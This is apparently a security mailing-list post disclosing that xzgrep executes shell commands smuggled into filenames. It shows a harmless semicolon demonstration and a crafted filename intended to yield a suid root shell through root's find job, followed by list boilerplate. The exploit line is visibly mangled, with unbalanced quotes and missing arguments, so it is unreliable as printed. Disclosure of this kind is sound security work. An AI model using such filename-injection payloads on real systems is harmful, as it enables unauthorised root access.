Demonstration of the vulnerability:   sh-4.1$ touch /tmp/semi\;colon   sh-4.1$ xzgrep anystring /tmp/semi\;colon    xz: /tmp/semi: No such file or directory   /usr/bin/xzgrep: line colon: command not found   sh-4.1$  xzgrep tries extract/grep /tmp/semi and tries to execute "colon", which  is obviously not wanted.  With a specially crafted filename and three ounces of social  engineering, a local root exploit is possible. For example:   sh-4.1$ touch '/var/tmp/;echo -e "cp -p u+s >zzz;sh zzz;rm -f zzz'   sh-4.1# find /var/tmp -type f -exec xzgrep anystring {} \+ A suid root /var/tmp/bash should be the result.  I checked RHEL 6, CentOS 6: they run and they are vulnerable.  -- Bart Dopheide  Download attachment "signature.asc" of type "application/pgp-signature" bytes)  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.
